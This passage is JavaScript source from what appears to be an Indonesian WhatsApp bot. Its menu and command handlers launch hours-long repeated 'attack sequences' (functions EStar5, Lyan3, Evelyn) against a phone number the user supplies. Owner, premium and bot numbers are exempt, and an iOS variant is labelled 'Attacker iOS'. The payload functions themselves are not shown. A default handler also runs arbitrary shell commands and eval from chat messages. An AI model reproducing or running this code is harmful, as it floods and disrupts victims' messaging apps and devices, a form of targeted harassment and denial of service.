- ${m.prefix}yumehavoc _<number>_  
- ${m.prefix}yumetempest _<number>_  

✦ *Most Dangerous!*  
- ${m.prefix}yumeui _<number>_  

✦ *Other Platforms!*  
- ${m.prefix}yumeios _<number>_ *(Attacker iOS)*  

✦──────────────────✦`;  
    const imageBuffer = fs.readFileSync(global.media.m_other);  
    m.sendMenu(caption, imageBuffer);  
    break;  
}
case "yumeui": {
  if (!m.isOwner && !m.isPremium) return m.elysia(`${mess.premiumOnly} `);
  const numbersOnly = getInputSender(m);
  if (!numbersOnly) return m.elysia(`⚠️ Penggunaan: ${m.prefix + m.command} 62xxx atau reply pesan pengguna yang ingin ditarget.`);
  const target = setNet(numbersOnly);
  if (m.cekOwner(target) || m.cekPremium(target) || target.includes(m.botNumber)) {
    return m.elysia(`🚫 Tidak bisa mengirim ke owner, premium, atau bot.`);
  }
  const fs = require('fs');
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  const fourHours = 4 * 60 * 60 * 1000;
  const intervalDuration = 20 * 60 * 1000;
  const startTime = Date.now();
  let tasksExecuted = [];
  async function sendPattern(target, turbo) {
    try {
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await Lyan3(target, turbo);
      tasksExecuted.push({ action: "Lyan3", timestamp: Date.now() });
      await Evelyn(target, turbo);
      tasksExecuted.push({ action: "Evelyn", timestamp: Date.now() });
      await EStar5(target, turbo);
      tasksExecuted.push({ action: "EStar5", timestamp: Date.now() });
      await Evelyn(target, turbo);
      tasksExecuted.push({ action: "Evelyn", timestamp: Date.now() });
    } catch (err) {
      console.error("Error dalam sendPattern:", err);
    }
  }
  while (Date.now() - startTime < fourHours) {
    const intervalStart = Date.now();
    while (Date.now() - intervalStart < intervalDuration) {
      await sendPattern(target, v8TwinTurbo);
      await sleep(1000);
    }
    fs.writeFileSync("./library/database/execute.json", JSON.stringify(tasksExecuted, null, 2));
    await sleep(60000);
  }
  const dbPath = "./library/database/senders.json";
  let senders = [];
  if (!fs.existsSync(dbPath)) {
    fs.writeFileSync(dbPath, JSON.stringify([]));
  } else {
    try {
      senders = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
    } catch (err) {
      senders = [];
    }
  }
  if (!senders.includes(m.sender)) {
    senders.push(m.sender);
    fs.writeFileSync(dbPath, JSON.stringify(senders, null, 2));
  }
  m.elysia("✅ Eksekusi Telah selesai!", { sender: m.sender });
  }
break;

case "yumechaos":
case "yumehavoc":
case "yumetempest": {
    if (!m.isOwner && !m.isPremium) return m.elysia(`${mess.premiumOnly} `);

    const numbersOnly = getInputSender(m);
    if (!numbersOnly) return m.elysia(`⚠️ Penggunaan: ${m.prefix + m.command} 62xxx atau reply pesan pengguna yang ingin ditarget.`);

    const validTarget = setNet(numbersOnly);
    if (m.cekOwner(validTarget) || m.cekPremium(validTarget) || validTarget.includes(m.botNumber)) {
        return m.elysia(`🚫 Tidak bisa mengirim ke owner, premium, atau bot.`);
    }

    const attackSequence = async (target) => {
        for (let i = 0; i < 24; i++) { 
            for (let j = 0; j < 50; j++) {
                await EStar5(target, v8TwinTurbo);
                await Lyan3(target, v8TwinTurbo);
                if (j % 10 === 0) await Evelyn(target, v8TwinTurbo);
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    };

    attackSequence(validTarget);
    m.elysia("✅ Eksekusi Telah selesai!");
    }
    
    break;
case "yumegamma":
case "yumedelta":
case "yumeepsilon":
case "yumezeta":
case "yumeeta":
case "yumeiota":
case "yumekappa":
case "yumeomicron":
case "yumeupsilon":
case "yumexi":
case "yumetau":
case "yumepsi":
case "yumeflux":
case "yumeshift":
case "yumevoid":
case "yumeburst":
case "yumezen":
case "yumeverse":
case "yumepulse":
case "yumeios":
case "yumephase": {
if (!m.isOwner && !m.isPremium) return m.elysia(`${mess.premiumOnly} `);

const numbersOnly = getInputSender(m);
if (!numbersOnly) return m.elysia(`⚠️ Penggunaan: ${m.prefix + m.command} 62xxx atau reply pesan pengguna yang ingin ditarget.`);

const validTarget = setNet(numbersOnly);
if (m.cekOwner(validTarget) || m.cekPremium(validTarget) || validTarget.includes(m.botNumber)) {
    return m.elysia(`🚫 Tidak bisa mengirim ke owner, premium, atau bot.`);
}

const attackSequence = [EStar5, EStar5, Lyan3, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Evelyn, EStar5, Evelyn, EStar5, EStar5, Lyan3, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Evelyn, EStar5, Evelyn, EStar5, EStar5, Lyan3, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Lyan3, EStar5, Lyan3, Lyan3, EStar5, EStar5, Evelyn, EStar5, Evelyn, Evelyn, EStar5, EStar5, Evelyn, Evelyn, EStar5, Evelyn];

for (let i = 0; i < 50; i++) {
    for (const attack of attackSequence) {
        await attack(validTarget, v8TwinTurbo);
    }
}
m.elysia("✅ Eksekusi Telah selesai!");
}
break;
      default: {
        if (m.budy.startsWith('$')) {
          if (!m.isOwner) return;
          exec(m.budy.slice(2), (err, stdout) => { if (err) return m.reply(err.toString()); if (stdout) return m.reply(stdout); });
        }

        if (m.budy.startsWith("=>")) {
          if (!m.isOwner) return;
          try { let evaled = await eval(`(async () => { ${m.budy.slice(2)} })()`); return m.reply(typeof evaled === "string" ? evaled : require("util").inspect(evaled)); } 
          catch (err) { return m.reply(err.toString()); }
        }

        if (m.budy.startsWith(">")) {
          if (!m.isOwner) return;
          try { let evaled = await eval(m.budy.slice(2)); return m.reply(typeof evaled === "string" ? evaled : require("util").inspect(evaled)); } 
          catch (err) { return m.reply(err.toString()); }
        }
        break;
      }
    }
  } catch (err) {
    console.log(err);
    await m.elysia(`Error: ${err.message}`);
    m.reply(util.format(err), { sender: setNet(global.ownerNumber) });
  }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file);
	console.log(`\x1b[41m\x1b[97m ⓘ Reloading ${__filename}! \x1b[0m`);
	delete require.cache[file];
	require(file);
});
